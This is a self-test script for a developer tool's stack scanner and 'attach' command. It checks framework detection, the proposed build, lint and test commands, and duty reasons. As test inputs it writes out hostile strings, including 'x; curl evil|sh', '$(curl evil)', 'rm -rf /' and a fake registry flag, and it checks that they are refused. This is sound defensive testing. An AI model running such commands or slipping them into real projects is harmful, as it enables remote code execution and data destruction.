#!/bin/bash
# The stack scan and what attach shows of it: the framework and tools named from files, build and lint proposed next to verify, a reason for every
# duty, suggestions that stay off. Small committed fixtures (fixtures/stacks/*) are copied to a temp folder and given a git repository; nothing is
# installed and nothing from the project is run. No network, no model, no GitHub; a temp data folder with the .quarterdeck-home marker and a temp
# HOME, never the real home. QD_STACK_BIN may point at another copy of bin/ (used to see the checks fail on the code from before this change).
set -u
REAL="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BIN="${QD_STACK_BIN:-$REAL/bin}"
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
mkdir -p "$T/data" "$T/home" "$T/proj"; : > "$T/data/.quarterdeck-home"
export QUARTERDECK_HOME="$T/data" HOME="$T/home" QUARTERDECK_PROJECT_ROOTS="$T" PYTHONDONTWRITEBYTECODE=1
unset QUARTERDECK_DIR QUARTERDECK_SECRETS_DIR PROJECTS_FILE
fails=0
ck() { if eval "$2"; then printf '  ok    %s\n' "$1"; else printf '  FAIL  %s\n' "$1"; fails=$((fails+1)); fi; }

for f in react-vite next node-plain python go rust; do
  cp -R "$REAL/fixtures/stacks/$f" "$T/proj/$f"
  ( cd "$T/proj/$f" && git init -q . ) >/dev/null 2>&1
done

echo "stack: the fixtures, the sentence, the commands, the duties, the page's JSON"
BIN="$BIN" REAL="$REAL" T="$T" python3 - <<'PY'
import json, os, sys, time
sys.path.insert(0, os.environ["BIN"])
import scan, attach
T, REAL = os.environ["T"], os.environ["REAL"]
fails = 0
def ck(label, cond, detail=None):
    global fails
    if cond:
        print("  ok    " + label)
    else:
        fails += 1
        print("  FAIL  " + label + (("  " + str(detail)[:300]) if detail is not None else ""))
def prop(name):
    prof = scan.scan(os.path.join(T, "proj", name))
    return prof, attach.propose(prof)
OLD_RULE = lambda verify: ["surveyor", "foreman", "inspector"] + (["shipwright"] if verify else [])
WANT = {
 "react-vite": ("React 18 with Vite, tests by Vitest, lint by ESLint, package manager npm", "web-ui", "npm test", "npm run build", "npm run lint"),
 "next": ("Next.js 14 with TypeScript and Tailwind, tests by Jest, lint by ESLint, package manager pnpm", "web-ui", "pnpm test", "pnpm run build", "pnpm run lint"),
 "node-plain": ("Node with Express, tests by Jest, package manager yarn", "web-api", "yarn test", "", ""),
 "python": ("FastAPI with pytest, lint by ruff, package manager poetry", "web-api", "python -m pytest", "", "ruff check ."),
 "go": ("Go 1.22 with Gin, tests by go test", "web-api", "go test ./...", "go build ./...", "go vet ./..."),
 "rust": ("Rust (2021 edition) with Axum, tests by cargo test, lint by Clippy", "web-api", "cargo test", "cargo build", "cargo clippy"),
}
ALL = {}
for name, (sentence, app, verify, build, lint) in WANT.items():
    prof, pr = prop(name)
    ALL[name] = (prof, pr)
    st, e = prof["stack"], pr["entry"]
    ck(f"{name}: the stack sentence is exactly '{sentence}'", st["summary"] == sentence, st["summary"])
    ck(f"{name}: the app kind is {app}", st["app"] == app, st["app"])
    ck(f"{name}: verify, build and lint are {verify!r}, {build!r}, {lint!r}", (e["verify"], e["build"], e["lint"]) == (verify, build, lint), (e["verify"], e["build"], e["lint"]))
    ck(f"{name}: every proposed command is one plain command line", all(attach.VERIFY_OK.fullmatch(e[k]) for k in ("verify", "build", "lint") if e[k]))
    ck(f"{name}: build and lint have a reason", bool(pr["reasons"]["build"]) and bool(pr["reasons"]["lint"]))
    ck(f"{name}: entry.duties is exactly the old rule (nothing suggested is on)", e["duties"] == OLD_RULE(e["verify"]) and not set(pr["suggested"]) & set(e["duties"]), e["duties"])
    ck(f"{name}: every fact has a kind, a name and evidence", st["facts"] and all(f["kind"] in ("framework", "tool", "test", "lint", "build", "language", "package_manager", "runtime") and f["name"] and f["evidence"] for f in st["facts"]))
    ck(f"{name}: reasons.duties is still one sentence", isinstance(pr["reasons"]["duties"], str) and pr["reasons"]["duties"].startswith("read-only duties first"))
    plan = pr["duty_reasons"]
    ck(f"{name}: every duty has on, suggested and a plain reason", set(plan) == attach.known_duties() and all(set(v) == {"on", "suggested", "why"} and isinstance(v["why"], str) and len(v["why"]) > 8 for v in plan.values()))
    ck(f"{name}: shipwright is on because a verify command exists", plan["shipwright"]["on"] and "verify" in plan["shipwright"]["why"])
    ck(f"{name}: infra is off and not suggested", not plan["infra"]["on"] and not plan["infra"]["suggested"])
    ck(f"{name}: planner, harbourmaster and purser say they need a GitHub repo", all(not plan[d]["on"] and not plan[d]["suggested"] and "GitHub" in plan[d]["why"] for d in ("planner", "harbourmaster", "purser")))
    ck(f"{name}: a suggested duty is never on", all(not (v["on"] and v["suggested"]) for v in plan.values()))
    ck(f"{name}: assayer, caulker and trials are suggested because a test command exists", all(plan[d]["suggested"] and not plan[d]["on"] for d in ("assayer", "caulker", "trials")))
for name in ("react-vite", "next"):
    pl = ALL[name][1]["duty_reasons"]
    ck(f"{name}: joiner is suggested (a UI project), off", pl["joiner"]["suggested"] and not pl["joiner"]["on"] and "joiner" in ALL[name][1]["suggested"])
    ck(f"{name}: lookout and pilot are suggested and say they need qa settings", all(pl[d]["suggested"] and "qa settings" in pl[d]["why"] for d in ("lookout", "pilot")))
for name in ("python", "go", "rust", "node-plain"):
    pl = ALL[name][1]["duty_reasons"]
    ck(f"{name}: joiner, lookout and pilot are not suggested", not any(pl[d]["suggested"] for d in ("joiner", "lookout", "pilot")))
ck("quartermaster is suggested where a manifest and a lockfile exist, and says so where there is no lockfile",
   ALL["react-vite"][1]["duty_reasons"]["quartermaster"]["suggested"] and ALL["next"][1]["duty_reasons"]["quartermaster"]["suggested"] and not ALL["go"][1]["duty_reasons"]["quartermaster"]["suggested"])
ck("the existing profile keys keep their meaning: Vite, Vitest and React are frameworks, the npm test command is listed", {"React", "Vite", "Vitest"} <= {i["name"] for i in ALL["react-vite"][0]["frameworks"]} and "test: npm test" in {c["name"] for c in ALL["react-vite"][0]["commands"]})
ck("commands use the package manager's own runner", "build: pnpm run build" in {c["name"] for c in ALL["next"][0]["commands"]} and "start: yarn start" in {c["name"] for c in ALL["node-plain"][0]["commands"]})
ck("Go, Rust and Python frameworks reach the old frameworks list too", "Gin" in {i["name"] for i in ALL["go"][0]["frameworks"]} and "Axum" in {i["name"] for i in ALL["rust"][0]["frameworks"]} and "FastAPI" in {i["name"] for i in ALL["python"][0]["frameworks"]})

# the lockfile / packageManager rules and the runner per manager
import tempfile, shutil
def mk(files):
    d = tempfile.mkdtemp(dir=T)
    for rel, text in files.items():
        p = os.path.join(d, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as f:
            f.write(text)
    return d
PJ = lambda extra="": '{"scripts":{"build":"x","lint":"y","test":"z","dev":"d"},"dependencies":{"react":"^18"}' + extra + "}"
for lock, mgr, build, test in (("yarn.lock", "yarn", "yarn build", "yarn test"), ("pnpm-lock.yaml", "pnpm", "pnpm run build", "pnpm test"), ("bun.lockb", "bun", "bun run build", "bun run test"), ("package-lock.json", "npm", "npm run build", "npm test")):
    pr = attach.propose(scan.scan(mk({"package.json": PJ(), lock: ""})))
    ck(f"{lock} means {mgr}: build is '{build}' and verify is '{test}'", (pr["entry"]["build"], pr["entry"]["verify"]) == (build, test), pr["entry"])
pr = attach.propose(scan.scan(mk({"package.json": PJ(',"packageManager":"pnpm@9.1.0"'), "yarn.lock": ""})))
ck("the packageManager field wins over a lockfile, and its version is kept", pr["entry"]["build"] == "pnpm run build" and any(f["kind"] == "package_manager" and f["name"] == "pnpm" and f["version"] == "9" for f in scan.scan(mk({"package.json": PJ(',"packageManager":"pnpm@9.1.0"'), "yarn.lock": ""}))["stack"]["facts"]))
pr = attach.propose(scan.scan(mk({"package.json": PJ()})))
ck("no lockfile and no field means npm", pr["entry"]["build"] == "npm run build" and pr["stack"].endswith("package manager npm"), pr["stack"])
# a monorepo: the package.json nearest the root wins, nested ones fill the gaps
mono = mk({"package.json": '{"workspaces":["packages/*"],"scripts":{"test":"vitest run"},"devDependencies":{"vite":"^4.0.0"}}', "packages/web/package.json": '{"dependencies":{"react":"^17.0.2","vite":"^5.0.0"},"scripts":{"build":"vite build"}}'})
f = {x["name"]: x for x in scan.scan(mono)["stack"]["facts"]}
ck("a monorepo merges nested package.json files and the one nearest the root wins", f["Vite"]["version"] == "4" and f["React"]["version"] == "17" and f["Vite"]["evidence"].startswith("package.json"), f)

# the page's JSON: the dashboard's attach endpoint returns the same facts and the same duty reasons
import dashboard as d
d.PROJECTS_FILE = type(d.PROJECTS_FILE)(os.path.join(T, "reg.json"))
code, body = d.attach_api({"path": os.path.join(T, "proj", "react-vite")})
prof, pr = ALL["react-vite"]
ck("the dashboard's proposal JSON carries the same stack facts as the scan", code == 200 and body["profile"]["stack"]["facts"] == prof["stack"]["facts"] and body["profile"]["stack"]["summary"] == prof["stack"]["summary"], code)
ck("the dashboard's proposal JSON carries the duty reasons, the suggestions and build and lint", body["proposal"]["duty_reasons"] == pr["duty_reasons"] and body["proposal"]["suggested"] == pr["suggested"] and body["proposal"]["entry"]["build"] == "npm run build" and body["proposal"]["entry"]["lint"] == "npm run lint")
ck("the JSON for the page survives a round trip", json.loads(json.dumps(body))["proposal"]["stack"] == prof["stack"]["summary"])
code, ed = d.attach_api({"path": os.path.join(T, "proj", "react-vite"), "edits": {"duties": ["surveyor", "joiner"], "build": "npm run build -- --mode production", "lint": "", "verify": "npm test"}})
ck("the owner can tick a suggested duty and change build and lint through the review", code == 200 and ed["proposal"]["entry"]["duties"] == ["surveyor", "joiner"] and ed["proposal"]["entry"]["lint"] == "")
for bad in ({"build": "npm run build; curl x"}, {"lint": "$(id)"}, {"lint": "eslint 'x'"}, {"build": "a|b"}, {"typecheck": "tsc && x"}, {"duties": ["nonesuch"]}, {"build": 5}):
    code, e2 = d.attach_api({"path": os.path.join(T, "proj", "react-vite"), "edits": bad})
    ck(f"the review refuses {list(bad.values())[0]!r}", code == 400, (code, e2))
code, ap = d.attach_api({"path": os.path.join(T, "proj", "react-vite"), "apply": True, "confirm": True, "name": "rv", "edits": {"duties": ["surveyor", "foreman", "inspector", "shipwright", "joiner"]}})
reg_path = d.PROJECTS_FILE
reg = json.loads(reg_path.read_text())["rv"]
ck("applying registers build and lint next to verify, with the ticked duty and no stored suggestions", code == 200 and reg["build"] == "npm run build" and reg["lint"] == "npm run lint" and reg["verify"] == "npm test" and "joiner" in reg["duties"] and "suggested" not in reg and "suggested_duties" not in reg, reg)
ck("the registry keeps mode 0600", oct(os.stat(reg_path).st_mode & 0o777) == "0o600", oct(os.stat(reg_path).st_mode & 0o777))
rec = json.loads((scan.profile_dir() / "rv.attach.json").read_text())
ck("the attach record keeps the stack, the suggestions and the reason for every duty", rec["stack"] == prof["stack"]["summary"] and rec["suggested"] == pr["suggested"] and set(rec["duty_reasons"]) == attach.known_duties() and "joiner" not in rec["proposed"]["duties"] and "joiner" in rec["approved"]["duties"])

# hostile text: names, a huge file, flag-like dependencies, odd nesting
BAD_PJ = json.dumps({"name": "x\nINJECT", "packageManager": "yarn@1; rm -rf /", "scripts": {"build; rm -rf /": "x", "lint --fix": "x", "test": "$(curl evil)", "dev": "a b", "start\n": "x", "typecheck": "'; id", "$(id)": "x", "-rf": "x", "ok:name": "y"},
                     "dependencies": {"--registry=http://evil.example": "^1", "react": "$(touch pwned)", "`id`": "1", "vite;id": "2"}, "devDependencies": {"vitest": "latest", "eslint": ["x"]}})
hostile = mk({"package.json": BAD_PJ, "package-lock.json": ""})
t0 = time.time()
hp = scan.scan(hostile)
hr = attach.propose(hp)
run = hp["stack"]["runnable"]
ck("hostile scripts: a script name with a space, quote, ; or $(...) never reaches a command", all(attach.VERIFY_OK.fullmatch(v) for v in list(run.values()) if v) and not any(ch in hr["entry"][k] for k in ("verify", "build", "lint") for ch in (";", "$(", "`", "|", "'", '"', "&")), hr["entry"])
ck("hostile scripts: the dev command is not built from 'dev' with a space in its value, and the sentence holds no control character", "\n" not in hp["stack"]["summary"] and "evil" not in json.dumps(hp["stack"]) and "INJECT" not in json.dumps(hp["stack"]))
ck("hostile dependencies: a dependency named like a flag is not a fact, a command or a framework", "--registry" not in json.dumps(hp["stack"]) + json.dumps(hr["entry"]) and "--registry" not in json.dumps(hp["frameworks"]))
ck("hostile package.json: every fact is plain text, one line", all("\n" not in x["evidence"] and "\n" not in x["name"] for x in hp["stack"]["facts"]) and all(len(x["evidence"]) <= 120 for x in hp["stack"]["facts"]))
huge = mk({"package.json": '{"dependencies":{"react":"18"},"pad":"' + "a" * (10 * 1024 * 1024) + '"}'})
t1 = time.time()
hg = scan.scan(huge)
ck("a 10 MB package.json is not read, is noted, and the scan is quick", time.time() - t1 < 5 and hg["stack"]["summary"] and any("not read" in n for n in hg["notes"]), hg["notes"])
deep = mk({"package.json": "[" * 200000 + "]" * 200000})
ck("a deeply nested package.json does not crash the scan", isinstance(scan.scan(deep)["stack"], dict))
odd = mk({"package.json": '{"dependencies":["react"],"devDependencies":"vite","scripts":["test"],"packageManager":5,"engines":[1]}'})
ck("a package.json whose fields have the wrong types does not crash the scan", isinstance(attach.propose(scan.scan(odd))["entry"], dict))
sh = mk({"package.json": '{"scripts":{"test":"echo \\"Error: no test specified\\" && exit 1"}}'})
ck("npm's placeholder test script is not a test command", attach.propose(scan.scan(sh))["entry"]["verify"] == "")
ck("a hostile Cargo.toml, go.mod and pyproject.toml do not crash the scan and add no odd command", all(isinstance(attach.propose(scan.scan(mk(fl)))["entry"], dict) for fl in (
    {"Cargo.toml": 'edition = "x"\n[dependencies]\n"--bad"=1\n' + "\x00" * 10, "src/main.rs": ""}, {"go.mod": "module a b; rm -rf /\ngo 9\n", "main.go": ""}, {"pyproject.toml": "[tool.poetry\n" + "fastapi\n" * 1000})))
gm = scan.scan(mk({"go.mod": "module evil.example/x;id\ngo 1.21\n"}))
ck("a go.mod module name with a ; is not carried into the facts", ";" not in json.dumps(gm["stack"]["facts"]))

# the scan runs no project code and touches no network
marker = os.path.join(T, "ran")
runs = mk({"package.json": '{"scripts":{"postinstall":"touch ' + marker + '","test":"vitest run"},"dependencies":{"react":"^18"}}', "vite.config.js": "require('fs').writeFileSync('" + marker + "', 'x')",
           "setup.py": "open('" + marker + "', 'w').write('x')", "conftest.py": "open('" + marker + "', 'w').write('x')", "build.rs": "fn main(){}", "Makefile": "test:\n\ttouch " + marker + "\n"})
import socket, subprocess
def snap(root):
    return sorted((os.path.relpath(os.path.join(dp, f), root), os.stat(os.path.join(dp, f)).st_mtime_ns) for dp, _, fs in os.walk(root) for f in fs)
before = snap(os.path.join(T, "proj", "next"))
def nope(*a, **k):
    raise AssertionError("the scan tried to start a process or open a connection")
saved = (socket.socket.connect, socket.getaddrinfo, subprocess.Popen, os.system, os.execv, os.posix_spawn)
socket.socket.connect, socket.getaddrinfo, subprocess.Popen, os.system, os.execv, os.posix_spawn = nope, nope, nope, nope, nope, nope
try:
    attach.propose(scan.scan(runs)); scan.scan(os.path.join(T, "proj", "next"))
    quiet = True
except AssertionError as ex:
    quiet = str(ex)
finally:
    socket.socket.connect, socket.getaddrinfo, subprocess.Popen, os.system, os.execv, os.posix_spawn = saved
ck("scanning starts no process, opens no connection and runs no project code", quiet is True and not os.path.exists(marker), quiet)
ck("scanning changes nothing in the project", snap(os.path.join(T, "proj", "next")) == before)

# the page and the docs
html = open(os.path.join(REAL, "dashboard", "index.html")).read()
ck("the attach page shows the stack sentence, the commands together, and a separate group of switched-off suggestions", all(s in html for s in ("id=\"at-stack\"", "at-build", "at-lint", "These also fit this stack, switched off")))
ck("the page's suggested duties are never ticked by the page itself", "dSug = known.filter(n => !e.duties.includes(n) && sugg.includes(n))" in html and "dutyGroup(dSug)" in html and "dutyBox(n, e.duties.includes(n))" in html)
for doc in ("README.md", "GUIDE.md"):
    txt = open(next(q for q in (os.path.join(REAL, "docs", "public", doc), os.path.join(REAL, doc)) if os.path.exists(q))).read()
    ck(f"{doc} describes the stack line, build and lint, and the switched-off suggestions", "also fit this stack" in txt)
dashes = (chr(0x2014), chr(0x2013))
mine = [os.path.join(REAL, "bin", "selftest-stack.sh")] + [os.path.join(dp, f) for dp, _, fs in os.walk(os.path.join(REAL, "fixtures", "stacks")) for f in fs]
ck("no em dash or en dash in the files this change wrote", not any(ch in open(p, errors="replace").read() for p in mine for ch in dashes))
sys.exit(1 if fails else 0)
PY
[ $? -eq 0 ] || fails=$((fails+1))

echo "stack: qtdeck attach prints it"
qtd() { if [ -n "${QD_STACK_BIN:-}" ]; then shift; python3 "$BIN/attach.py" "$@"; else bash "$REAL/bin/qtdeck" "$@"; fi; }   # the old-code run has no qtdeck of its own: attach is what qtdeck runs
touch "$T/stamp"; sleep 1
qtd attach "$T/proj/react-vite" >"$T/o1" 2>&1; r1=$?
ck "attach prints the stack line" '[ $r1 = 0 ] && grep -qE "^ +stack +React 18 with Vite, tests by Vitest, lint by ESLint, package manager npm$" "$T/o1"'
ck "attach prints verify, build and lint together, each with its reason" 'grep -qE "verify +npm test +\(package.json scripts.test\)" "$T/o1" && grep -qE "build +npm run build +\(package.json scripts.build\)" "$T/o1" && grep -qE "lint +npm run lint +\(package.json scripts.lint\)" "$T/o1"'
ck "attach prints the duties that are on with a reason in a few words" 'grep -qE "duties +surveyor \(reads pull requests\), foreman \([^)]+\), inspector \([^)]+\), shipwright \(a verify command exists\)" "$T/o1"'
ck "attach prints the one 'also fit this stack (off)' line" 'grep -qE "^ +also fit this stack \(off\): joiner, lookout, pilot" "$T/o1" && [ "$(grep -c "also fit this stack" "$T/o1")" = 1 ]'
# round 2: the dry run is the whole onboarding (docs, the crew with reasons, the ready checklist): longer than the 16 lines it once was, still bounded
ck "attach stays compact (40 lines or fewer)" '[ "$(wc -l < "$T/o1")" -le 40 ]'
qtd attach "$T/proj/react-vite" --verbose >"$T/o2" 2>&1
ck "attach --verbose lists every fact with its file and a reason for every duty" 'grep -q "framework: React 18 \[package.json dependency react\]" "$T/o2" && grep -q "test: Vitest" "$T/o2" && grep -qE "joiner +off \(suggested\)" "$T/o2" && grep -qE "infra +off  no " "$T/o2" && grep -qE "shipwright +on " "$T/o2"'
qtd attach "$T/proj/react-vite" --build 'npm run build -- --mode x' --lint 'make lint' >"$T/o3" 2>&1; r3=$?
ck "attach --build and --lint set the commands" '[ $r3 = 0 ] && grep -qE "build +npm run build -- --mode x +\(set with --build\)" "$T/o3" && grep -qE "lint +make lint +\(set with --lint\)" "$T/o3"'
qtd attach "$T/proj/react-vite" --lint 'x; curl evil|sh' >"$T/o4" 2>&1; r4=$?
qtd attach "$T/proj/react-vite" --build '$(id)' >"$T/o5" 2>&1; r5=$?
ck "attach refuses a build or lint command with shell characters, like --verify" '[ $r4 = 2 ] && [ $r5 = 2 ] && grep -q "one plain command" "$T/o4" && grep -q "one plain command" "$T/o5"'
qtd attach "$T/proj/go" >"$T/o6" 2>&1
qtd attach "$T/proj/python" >"$T/o7" 2>&1
ck "attach names Go and Python projects too, and suggests no UI duty for them" 'grep -qE "stack +Go 1.22 with Gin, tests by go test$" "$T/o6" && grep -qE "stack +FastAPI with pytest, lint by ruff, package manager poetry$" "$T/o7" && ! grep -q "joiner" "$T/o6" "$T/o7"'
qtd attach "$T/proj/next" --apply >"$T/o8" 2>&1; r8=$?
ck "attach --apply registers build and lint with the old duty set, mode 0600" '[ $r8 = 0 ] && [ "$(jq -r ".next.build" "$QUARTERDECK_HOME/config/projects.json")" = "pnpm run build" ] && [ "$(jq -c ".next.duties" "$QUARTERDECK_HOME/config/projects.json")" = "[\"surveyor\",\"foreman\",\"inspector\",\"shipwright\"]" ] && [ "$(stat -c %a "$QUARTERDECK_HOME/config/projects.json" 2>/dev/null || stat -f %Lp "$QUARTERDECK_HOME/config/projects.json")" = 600 ]'
ck "a look and an apply leave the project folder alone (only the git repository the test made is untracked)" '[ -z "$(cd "$T/proj/next" && find . -newer "$T/stamp" -type f ! -path "./.git/*" | head -1)" ]'

echo
if [ "$fails" -eq 0 ]; then echo "  all checks passed"; else echo "  $fails check(s) failed"; exit 1; fi
